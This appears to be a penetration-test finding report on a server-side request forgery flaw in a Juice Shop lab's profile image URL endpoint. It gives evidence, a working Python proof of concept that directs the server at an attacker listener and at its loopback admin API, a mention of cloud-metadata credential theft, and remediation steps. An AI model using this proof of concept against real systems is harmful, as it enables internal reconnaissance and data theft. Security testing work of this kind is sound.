# SSRF with response disclosure via /profile/image/url imageUrl fetch

**ID:** vuln-0014
**Severity:** MEDIUM
**Found:** 2026-09-11 20:00:31 UTC
**Target:** http://host.docker.internal:3001
**Method:** POST
**CVSS:** 6.4
**Confidence:** High
**Fix Effort:** Low

## Description

The profile image URL upload feature accepts a user-supplied `imageUrl` and performs a server-side `fetch()` of that URL with no allowlist, scheme, or IP-range validation. Any authenticated user can make the application server issue HTTP requests to arbitrary internal or external destinations, and the fetched response body is persisted and retrievable.

## Evidence

Captured inbound request (attacker-controlled listener on 192.168.215.4:3999): `[2026-09-11T19:59:15.707611] GET /ssrf-poc-final.png from 192.168.215.3 UA=node` — source IP `192.168.215.3` is the Juice Shop application container (the testing agent is `192.168.215.4`), `User-Agent: node` is the server's runtime fetch. The fetched JPEG body (206 bytes) was then served at `http://host.docker.internal:3001/assets/public/images/uploads/25.png`, proving response-body retrieval. Internal read-back: submitting `imageUrl=http://127.0.0.1:3000/rest/admin/application-version` caused the server to fetch its own API and the response `{"version":"20.2.0"}` was retrievable at `/assets/public/images/uploads/25.jpg`.

## Impact

An authenticated attacker can (1) reach internal-only services from the application server's network position (demonstrated against the app's own loopback API with content returned to the attacker), and (2) make the server fetch any external host, with the response body stored server-side and downloadable by the attacker. This enables internal network reconnaissance, access to services not exposed to clients, and potential cloud-metadata credential theft on cloud deployments.

## Counterevidence

Tested and ruled out as false positives: unauthenticated requests are blocked ("Blocked illegal activity" — the token cookie is enforced, so this is not an unauthenticated SSRF); JSON and urlencoded bodies are parsed after this route mounts, so `{"imageUrl": ...}` JSON POSTs are silently ignored (no fetch occurs) — only multipart form-field delivery works; outbound fetch failures fall back to storing the raw URL as the profile image without any server request. No scheme allowlist, IP-range blocklist, or DNS pinning is applied to `imageUrl`; arbitrary schemes accepted by `fetch` (http/https at minimum) reach the sink. Cloud-metadata-style targets were not separately proven (169.254.169.254 not exercised); the captured callback plus loopback retrieval already demonstrate arbitrary attacker-chosen destinations.

## What Would Change This Severity

Demonstrating a fetch of the cloud metadata endpoint (169.254.169.254) returning credentials would raise severity to high/critical; conversely, if the deployed environment has no reachable internal services and egress is blocked, severity would drop to medium/low.

## Technical Analysis

`POST /profile/image/url` (authenticated via the `token` cookie) takes `req.body.imageUrl` and, without any validation, calls `fetch(url)` server-side. On a 2xx response the body is streamed to `<user-id>.<ext>` under the public uploads directory and the user's `profileImage` is updated, making the fetched content downloadable at `/assets/public/images/uploads/<id>.<ext>`; on fetch failure the raw URL is stored instead. Because the URL is used verbatim, the server can be directed at loopback/internal addresses (demonstrated: `http://127.0.0.1:3000/...`) or any external host, and the response body is disclosed to the requesting user. Note the request body must reach the handler via a `multipart/form-data` field, since the global JSON/urlencoded body parsers mount after this route.

## Proof of Concept

1. Log in and obtain the session `token` cookie. 2. Start an HTTP listener reachable from the application server (here 192.168.215.4:3999). 3. Send `POST /profile/image/url` with `Content-Type: multipart/form-data` containing field `imageUrl=http://192.168.215.4:3999/ssrf-poc-final.png` and the `token` cookie. 4. Observe the inbound `GET /ssrf-poc-final.png` on the listener from the application server (source 192.168.215.3, `User-Agent: node`). 5. Fetch `GET /assets/public/images/uploads/25.png` and receive the exact bytes the listener served, proving the server stored the fetched response. 6. Repeat with `imageUrl=http://127.0.0.1:3000/rest/admin/application-version` and retrieve `{"version":"20.2.0"}` from `/assets/public/images/uploads/25.jpg`, proving internal loopback fetch with content disclosure.

```python
import requests

BASE = "http://host.docker.internal:3001"
TOKEN = open("/workspace/recon_token.txt").read().strip()

# 1. SSRF to attacker-controlled host (listener on 192.168.215.4:3999)
r = requests.post(
    f"{BASE}/profile/image/url",
    cookies={"token": TOKEN},
    files={"imageUrl": (None, "http://192.168.215.4:3999/ssrf-poc-final.png")},
    allow_redirects=False,
)
print("upload:", r.status_code)  # 302 -> /profile

# 2. Verify the server fetched and stored the attacker-served body
img = requests.get(f"{BASE}/assets/public/images/uploads/25.png")
print("stored bytes:", len(img.content))  # 206 = attacker listener's JPEG body

# 3. Internal loopback fetch with content returned to the attacker
r = requests.post(
    f"{BASE}/profile/image/url",
    cookies={"token": TOKEN},
    files={"imageUrl": (None, "http://127.0.0.1:3000/rest/admin/application-version")},
    allow_redirects=False,
)
print("upload2:", r.status_code)
leaked = requests.get(f"{BASE}/assets/public/images/uploads/25.jpg")
print("internal response leaked:", leaked.text)  # {"version":"20.2.0"}
```

## Remediation

Validate the `imageUrl` server-side before fetching: resolve the hostname and reject loopback, link-local (169.254.0.0/16), and RFC1918/private ranges; restrict the scheme to https (or http plus an explicit origin allowlist); do not follow redirects; and enforce a response size and content-type allowlist. Alternatively, proxy image uploads through a dedicated egress-restricted fetcher and never persist raw response bodies to user-accessible assets.

## Assumptions

Assumes an authenticated (customer-level) session — the endpoint reads the `token` cookie. The attacker's listener must be network-reachable from the application server; in this deployment both share the docker network, and loopback/internal targets need no external reachability at all.
